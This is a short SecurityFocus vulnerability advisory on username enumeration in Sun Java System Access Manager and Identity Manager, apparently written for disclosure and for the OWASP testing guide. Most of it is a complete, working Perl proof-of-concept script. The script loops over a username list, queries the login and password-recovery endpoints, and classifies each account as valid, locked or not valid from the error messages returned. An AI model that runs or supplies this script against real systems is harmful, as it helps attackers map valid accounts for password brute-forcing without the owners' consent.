source: http://www.securityfocus.com/bid/33489/info

Sun Java System Access Manager is prone to a username-enumeration weakness because of a design error in the application when verifying user-supplied input.

Attackers may exploit this weakness to discern valid usernames. This may aid them in brute-force password cracking or other attacks.

This issue affects the following versions:

Sun Java System Access Manager 6 2005Q1 (6.3)
Sun Java System Access Manager 7 2005Q4 (7.0)
Sun Java System Access Manager 7.1

Sun OpenSSO is also reported vulnerable. 

#!/usr/bin/perl -w
#  POC: Sun Java Access Manager and Identity Manager Users Enumeration
#  Developed for OWASP Testing guide V3
#  Simple script for Sun Java access manager and Identity Manager users enumeration
#
#  Author   : Marco Mella <marco.mella <at> aboutsecurity.net>
#  Site     : www.aboutsecurity.net
#
# © Copyright, 2008-2009 Marco Mella 
# Sun Java System Access Manager and Sun Java System Identity Manager 
# are trademarks or registered trademarks of Sun Microsystems, Inc.
#
# Last updated: 13 Jun 2008
#
use Getopt::Long;
use LWP::UserAgent;
use Switch;
$Userfile = "";
$line="";


my ($server, $user_file, $switch);
my $banner = "Author: Marco Mella <marco.mella <at> aboutsecurity.net>\n";
my $usage= "Usage:\n $0 -server <ip_address|host> -port <tcp port> -userfile <filename> -switch<am|idm> \n\n";

my $opt = GetOptions (
	'server=s'	      => \$Server,
	'port=s'          => \$Port,
	'userfile=s'      => \$Userfile,
	'switch=s'        => \$Switch );
	
print "\n\n\n\n+-----------------------------------------------------------------------------------+\n\n";
print " Sun Java Access Manager and Identity Manager User Enumeration \n";
print " ".$banner."\n";
print "+-----------------------------------------------------------------------------------+\n\n";


if ( !$Server || !$Userfile ||!$Port  || !$Switch) { 
 print $usage;
 
 exit(1);
 }
 
 
if ( $Switch eq "am" ) {
 open(Userfile) or die("Could not open file: $Userfile\n\n");
 print "Users enumeration Sun java System Access Manager\n\n ";
 foreach $line (<Userfile>) {
 my $url = 'https://'.$Server.':'.$Port.'/amserver/UI/Login?user='.$line;
 my $browser = LWP::UserAgent->new;

 my $response = $browser->get($url);
 my @headers = $response->header_field_names;
 #print "response headers: @headers\n";

 $response->is_success or
    die "Failed to GET '$url': ", $response->status_line, "\n Aborintg";
     
 #print $response->as_string;  
chomp($line); 

# Analysis of response and title of web page received
 if(($response->content =~ m{This user is not active} ) || ($response->title =~ m{User Inactive})) {
#    print $response->content;
#    print "\n\n\n\n";   
#    print $response->title;
    print "\n\tUser: $line not valid\n\n"}
    
  elsif (($response->content =~ m{No configuration found} ) || ($response->title =~ m{No Configuration Error})) {
    print "\n\tUser: $line yeah ... Active user! \n\n"}
    
   elsif ($response->content =~ m{Your account has been locked.} ) {
    print "\n\tUser: $line Exist but Account has been locked\n\n"}    
  
  else {
     print "\n\tUser: $line    Active ???? Maybe you have to analizing the error message received \n\n"}
  }
  print "\n\n";
  close(Userfile);
 }



 if ( $Switch eq "idm" ) {
 open(Userfile) or die("Could not open file: $Userfile\n\n");
 print "Users enumeration Sun java System Identity Manager - Login Feature Analysis\n\n ";
 
 foreach $line (<Userfile>) {
 my $url = 'https://'.$Server.':'.$Port.'/idm/login.jsp?id=&command=login&activeControl=&accountId='.$line.'&password=';
 my $browser = LWP::UserAgent->new;

 my $response = $browser->get($url);
 my @headers = $response->header_field_names;
 my $title = $response->title;
 #print "response headers: @headers\n";

 $response->is_success or
    die "Failed to GET '$url': ", $response->status_line, "\n Aborintg";
     
 #print $response->as_string; 
 chomp($line);
 
# Analysis of response and title of web page received
 if($response->content =~ m{Invalid Account ID} ) {
#    print $response->content;
#    print "\n\n\n\n";   
#    print $response->title;

    print "\n\tUser: $line not valid\n\n"}
    
  elsif ($response->content =~ m{Invalid Password} ) {
    print "\n\tUser: $line yeah ... Active user! \n\n"}
  
  elsif ($response->content =~ m{Your account has been locked.} ) {
    print "\n\tUser: $line Exist but Account has been locked\n\n"}  
    
  else {
     print "\n\tUser: $line    Active ???? Maybe you have to analizing the error message received \n\n"}
  }
  close(Userfile);
 }
 
 #IDM Recovery Feature
 #https://oiawf02:8081/idm/questionLogin.jsp?accountId=owasp&lang=en&cntry=US
 
 if ( $Switch eq "idm" ) {
 open(Userfile) or die("Could not open file: $Userfile\n\n");
 print "\n\n\n\nUsers enumeration Sun java System Identity Manager - Recovery Feature Analysis\n\n ";
 
 foreach $line (<Userfile>) {
 my $url = 'https://'.$Server.':'.$Port.'/idm/questionLogin.jsp?accountId='.$line;
 my $browser = LWP::UserAgent->new;

 my $response = $browser->get($url);
 my @headers = $response->header_field_names;
 my $title = $response->title;
 #print "response headers: @headers\n";

 $response->is_success or
    die "Failed to GET '$url': ", $response->status_line, "\n Aborintg";
     
 #print $response->as_string; 
 chomp($line);
 
# Analysis of response and title of web page received
 if($response->content =~ m{The specified user was not found} ) {
#    print $response->content;
#    print "\n\n\n\n";   
#    print $response->title;

    print "\n\tUser: $line not valid\n\n"}
    
  elsif ($response->content =~ m{Too few user} ) {
    print "\n\tUser: $line yeah ... Active user! \n\n"}
  
  elsif ($response->content =~ m{Your account has been locked.} ) {
    print "\n\tUser: $line Exist but Account has been locked\n\n"}  
    
  else {
     print "\n\tUser: $line    Active ???? Maybe you have to analizing the error message received \n\n"}
  }
  print "\n\n";
  close(Userfile);
 }